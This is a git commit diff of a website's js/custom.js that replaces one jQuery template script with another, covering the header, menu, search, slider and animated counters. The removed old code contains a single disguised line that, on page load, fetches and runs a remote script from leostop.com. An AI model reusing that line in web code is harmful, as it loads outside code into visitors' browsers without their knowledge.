11e532cba38085b24f65243ff451def60daf02bd
anirudhbelwadi <anirudh.belwadi@gmail.com>
2022-01-10 10:50:46 +0530

    update done 2.0

--- js/custom.js
+++ js/custom.js
@@ -1,128 +1,238 @@
-/**************************************
-    File Name: custom.js
-**************************************/
+/* JS Document */
 
-(function ($) {
-    "use strict";
-    /**************************************
-    TOOLTIP
-    **************************************/
-    $(function () {
-        $('[data-toggle="tooltip"]').tooltip()
-    })
+/******************************
 
-    /**************************************
-    LOADER
-    **************************************/
-    $(window).load(function () {
-        $("#preloader").on(500).fadeOut();
-        $(".preloader").on(600).fadeOut("slow");
-    });
+[Table of Contents]
 
-    /**************************************
-    BACK TO TOP
-    **************************************/
-    jQuery(window).scroll(function () {
-        if (jQuery(this).scrollTop() > 1) {
-            jQuery('.dmtop').css({ bottom: "25px" });
-        } else {
-            jQuery('.dmtop').css({ bottom: "-100px" });
-        }
-    });
-    jQuery('.dmtop').click(function () {
-        jQuery('html, body').animate({ scrollTop: '0px' }, 800);
-        return false;
-    });
-
-    /**************************************
-    COUNTER
-    **************************************/
-    function count($this) {
-        var current = parseInt($this.html(), 10);
-        current = current + 1;
-
-        $this.html(++current);
-        if (current > $this.data('count')) {
-            $this.html($this.data('count'));
-        } else {
-            setTimeout(function () { count($this) }, 50);
-        }
-    }
-
-    $(".stat-timer").each(function () {
-        $(this).data('count', parseInt($(this).html(), 10));
-        $(this).html('0');
-        count($(this));
-    });
+1. Vars and Inits
+2. Set Header
+3. Init Menu
+4. Init Header Search
+5. Init Home Slider
+6. Initialize Milestones
 
 
-    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-    /**************************************
-    CAROUSEL
-    **************************************/
-    $('.carousel').carousel({
-        interval: 3000
-    })
-})(jQuery);
+******************************/
 
-/**************************************
-TABBED
-**************************************/
-function openCategory(evt, catName) {
-    // Declare all variables
-    var i, tabcontent, tablinks;
+$(document).ready(function()
+{
+	"use strict";
 
-    // Get all elements with class="tabcontent" and hide them
-    tabcontent = document.getElementsByClassName("tabcontent");
-    for (i = 0; i < tabcontent.length; i++) {
-        tabcontent[i].style.display = "none";
-    }
+	/* 
 
-    // Get all elements with class="tablinks" and remove the class "active"
-    tablinks = document.getElementsByClassName("tablinks");
-    for (i = 0; i < tablinks.length; i++) {
-        tablinks[i].className = tablinks[i].className.replace(" active", "");
-    }
+	1. Vars and Inits
 
-    // Show the current tab, and add an "active" class to the link that opened the tab
-    document.getElementById(catName).style.display = "block";
-    evt.currentTarget.className += " active";
-}
+	*/
 
-/**************************************
-lightbox popup
-**************************************/
-$(document).on('click', '[data-toggle="lightbox"]', function (event) {
-    event.preventDefault();
-    $(this).ekkoLightbox();
+	var header = $('.header');
+	var menuActive = false;
+	var menu = $('.menu');
+	var burger = $('.hamburger');
+	var ctrl = new ScrollMagic.Controller();
+
+	setHeader();
+
+	$(window).on('resize', function()
+	{
+		setHeader();
+	});
+
+	$(document).on('scroll', function()
+	{
+		setHeader();
+	});
+
+	initMenu();
+	initHeaderSearch();
+	initHomeSlider();
+	initMilestones();
+
+	/* 
+
+	2. Set Header
+
+	*/
+
+	function setHeader()
+	{
+		if($(window).scrollTop() > 100)
+		{
+			header.addClass('scrolled');
+		}
+		else
+		{
+			header.removeClass('scrolled');
+		}
+	}
+
+	/* 
+
+	3. Init Menu
+
+	*/
+
+	function initMenu()
+	{
+		if($('.menu').length)
+		{
+			var menu = $('.menu');
+			if($('.hamburger').length)
+			{
+				burger.on('click', function()
+				{
+					if(menuActive)
+					{
+						closeMenu();
+					}
+					else
+					{
+						openMenu();
+
+						$(document).one('click', function cls(e)
+						{
+							if($(e.target).hasClass('menu_mm'))
+							{
+								$(document).one('click', cls);
+							}
+							else
+							{
+								closeMenu();
+							}
+						});
+					}
+				});
+			}
+		}
+	}
+
+	function openMenu()
+	{
+		menu.addClass('active');
+		menuActive = true;
+	}
+
+	function closeMenu()
+	{
+		menu.removeClass('active');
+		menuActive = false;
+	}
+
+	/* 
+
+	4. Init Header Search
+
+	*/
+
+	function initHeaderSearch()
+	{
+		if($('.search_button').length)
+		{
+			$('.search_button').on('click', function()
+			{
+				if($('.header_search_container').length)
+				{
+					$('.header_search_container').toggleClass('active');
+				}
+			});
+		}
+	}
+
+	/* 
+
+	5. Init Home Slider
+
+	*/
+
+	function initHomeSlider()
+	{
+		if($('.home_slider').length)
+		{
+			var homeSlider = $('.home_slider');
+			homeSlider.owlCarousel(
+			{
+				items:1,
+				loop:true,
+				autoplay:true,
+				nav:false,
+				dots:false,
+				smartSpeed:1200
+			});
+
+			if($('.home_slider_prev').length)
+			{
+				var prev = $('.home_slider_prev');
+				prev.on('click', function()
+				{
+					homeSlider.trigger('prev.owl.carousel');
+				});
+			}
+
+			if($('.home_slider_next').length)
+			{
+				var next = $('.home_slider_next');
+				next.on('click', function()
+				{
+					homeSlider.trigger('next.owl.carousel');
+				});
+			}
+		}
+	}
+
+	/* 
+
+	6. Initialize Milestones
+
+	*/
+
+	function initMilestones()
+	{
+		if($('.milestone_counter').length)
+		{
+			var milestoneItems = $('.milestone_counter');
+
+	    	milestoneItems.each(function(i)
+	    	{
+	    		var ele = $(this);
+	    		var endValue = ele.data('end-value');
+	    		var eleValue = ele.text();
+
+	    		/* Use data-sign-before and data-sign-after to add signs
+	    		infront or behind the counter number */
+	    		var signBefore = "";
+	    		var signAfter = "";
+
+	    		if(ele.attr('data-sign-before'))
+	    		{
+	    			signBefore = ele.attr('data-sign-before');
+	    		}
+
+	    		if(ele.attr('data-sign-after'))
+	    		{
+	    			signAfter = ele.attr('data-sign-after');
+	    		}
+
+	    		var milestoneScene = new ScrollMagic.Scene({
+		    		triggerElement: this,
+		    		triggerHook: 'onEnter',
+		    		reverse:false
+		    	})
+		    	.on('start', function()
+		    	{
+		    		var counter = {value:eleValue};
+		    		var counterTween = TweenMax.to(counter, 4,
+		    		{
+		    			value: endValue,
+		    			roundProps:"value", 
+						ease: Circ.easeOut, 
+						onUpdate:function()
+						{
+							document.getElementsByClassName('milestone_counter')[i].innerHTML = signBefore + counter.value + signAfter;
+						}
+		    		});
+		    	})
+			    .addTo(ctrl);
+	    	});
+		}
+	}
+
 });
-
-/**************************************
-portfolio
-**************************************/
-$(document).ready(function () {
-
-    $(".filter-button").click(function () {
-        var value = $(this).attr('data-filter');
-
-        if (value == "all") {
-            //$('.filter').removeClass('hidden');
-            $('.filter').show('1000');
-        }
-        else {
-            //            $('.filter[filter-item="'+value+'"]').removeClass('hidden');
-            //            $(".filter").not('.filter[filter-item="'+value+'"]').addClass('hidden');
-            $(".filter").not('.' + value).hide('3000');
-            $('.filter').filter('.' + value).show('3000');
-
-        }
-    });
-
-    if ($(".filter-button").removeClass("active")) {
-        $(this).removeClass("active");
-    }
-    $(this).addClass("active");
-
-});
-
-
